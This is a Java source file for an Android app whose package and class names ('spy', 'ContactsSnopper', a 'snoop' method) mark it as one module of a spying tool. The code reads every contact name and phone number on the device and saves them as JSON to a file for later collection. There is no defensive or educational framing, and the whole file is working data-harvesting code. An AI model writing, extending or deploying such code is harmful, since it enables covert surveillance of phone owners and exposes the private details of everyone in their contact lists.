package com.gameofcoding.spy.spys;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import java.io.FileWriter;
import java.io.IOException;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import com.gameofcoding.spy.utils.XLog;
import java.io.File;

public class ContactsSnopper implements Spy {
    private final String TAG = "ContactsSnopper";
    public static final String CONTACTS_FILE_NAME = "contacts.json";
    private Context mContext;
    private File mDestFile;
    private final JSONArray contacts = new JSONArray();

    public ContactsSnopper(Context context, File destFile) {
	mContext = context;
	mDestFile = destFile;
    }

    @Override
    public void snoop() {
	ContentResolver contentResolver = mContext.getContentResolver();
	Cursor contCursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
						  null, null, null, null);
	if ((contCursor != null ? contCursor.getCount() : 0) > 0) {
	    while (contCursor != null && contCursor.moveToNext()) {
		// Load Contact
		String contactID = contCursor
		    .getString(contCursor.getColumnIndex(ContactsContract.Contacts._ID));
		String contactName = contCursor
		    .getString(contCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

		if (contCursor.getInt(contCursor.getColumnIndex(ContactsContract
								.Contacts.HAS_PHONE_NUMBER)) > 0) {
		    // Load Contact Phone Numbers
		    Cursor pNumsCursor = contentResolver
			.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
			       ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
			       new String[]{contactID}, null);
		    try {
			JSONArray pNumbers = new JSONArray();
			while (pNumsCursor.moveToNext()) {
			    String strPNumber = pNumsCursor
				.getString(pNumsCursor.getColumnIndex(ContactsContract
								      .CommonDataKinds.Phone.NUMBER));
			    pNumbers.put(strPNumber);
			}
			pNumsCursor.close();

			// Add loaded contact to JSON objects
			JSONObject contact = new JSONObject();
			contact.put("Name", contactName);
			contact.put("Phone Numbers", pNumbers);
			contacts.put(contact);
		    } catch(JSONException e) {
			throw new RuntimeException(e);
		    }
		}
	    }
	}
	if(contCursor != null)
	    contCursor.close();
	
	// Save contacts
	saveContacts(mDestFile);
    }

    public boolean saveContacts(File contactsFile) {
	if(contactsFile.isDirectory()) {
	    XLog.w(TAG, "saveContacts(File): contacts file '" + contactsFile + "' is a directory");
	    return false;
	}
	try {
	    FileWriter fw = new FileWriter(contactsFile);
	    fw.write(contacts.toString());
	    fw.flush();
	    fw.close();
	} catch(IOException e) {
	    XLog.e(TAG, "saveContacts(File): Error occurred while saving contacts.", e);
	}
	return true;
    }
}
